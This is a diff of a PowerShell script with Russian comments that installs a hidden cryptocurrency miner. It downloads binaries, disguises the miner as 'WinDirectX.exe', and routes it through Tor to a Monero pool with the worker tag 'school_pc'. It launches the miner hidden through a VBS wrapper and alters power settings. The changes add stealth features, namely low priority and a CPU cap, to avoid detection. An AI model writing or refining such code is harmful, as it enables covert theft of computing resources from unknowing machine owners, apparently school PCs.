@@ -64,11 +64,16 @@ if (!(Test-Path "$path\tor.exe")) {
     $web.DownloadFile("https://github.com/$user/sminers/raw/main/Windows", "$path\tor.exe")
 }
 
-# 6. СОЗДАНИЕ ЗАПУСКА (443 ПОРТ + TLS + TOR)
-$cmd = "@echo off`nstart /b $path\tor.exe --SocksPort 9050 --Quiet`ntimeout /t 25 /nobreak >nul`n$path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p school_pc --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050"
+# 6. СОЗДАНИЕ ЗАПУСКА (STEALTH + UZS OPTIMIZATION)
+$cmd = "@echo off`n" +
+"start /b $path\tor.exe --SocksPort 9050 --Quiet`n" +
+"timeout /t 25 /nobreak >nul`n" +
+"start /b /low $path\WinDirectX.exe -o gulf.moneroocean.stream:443 -u $wallet -p school_pc --algo rx/0 --tls --proxy=socks5://127.0.0.1:9050 --no-huge-pages --max-cpu-usage 50"
+
 $cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
 $vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
 $vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii
+
 
 # 7. ПИТАНИЕ И СТАРТ
 powercfg /x -monitor-timeout-ac 5
